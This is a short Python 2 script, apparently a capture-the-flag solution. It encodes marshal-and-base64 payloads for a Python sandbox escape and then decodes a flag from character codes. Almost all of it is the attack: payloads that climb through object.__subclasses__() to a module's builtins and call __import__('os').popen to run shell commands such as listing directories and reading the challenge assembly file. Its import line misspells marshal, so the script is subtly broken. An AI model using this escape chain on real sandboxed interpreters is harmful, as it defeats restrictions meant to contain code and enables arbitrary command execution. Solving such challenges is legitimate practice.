import marshall
import base64

print base64.b64encode(marshal.dumps('print().__class__. __base__'))
print base64.b64encode(marshal.dumps('toto =  ().__class__.__base__.__subclasses__()[59]()'))
print base64.b64encode(marshal.dumps('print dir'))
print base64.b64encode(marshal.dumps('print dir(toto._module.__builtins__)'))
print base64.b64encode(marshal.dumps('print toto._module.__builtins__["__import__"]("os").popen("pwd ; ls -al ").read()'))
print base64.b64encode(marshal.dumps('print toto._module.__builtins__["__import__"]("os").popen("nasm -f elf chall/SpaceX.asm ").read()'))
print base64.b64encode(marshal.dumps('print toto._module.__builtins__["__import__"]("os").popen("cat chall/SpaceX.asm ").read()'))


titi = [70,76,65,71,123,119,51,108,67,48,109,101,95,116,48,95,109,52,114,53,125]
flag_ar = []
for elem in titi:
    flag_ar.append(chr(elem))

print ''.join(flag_ar)

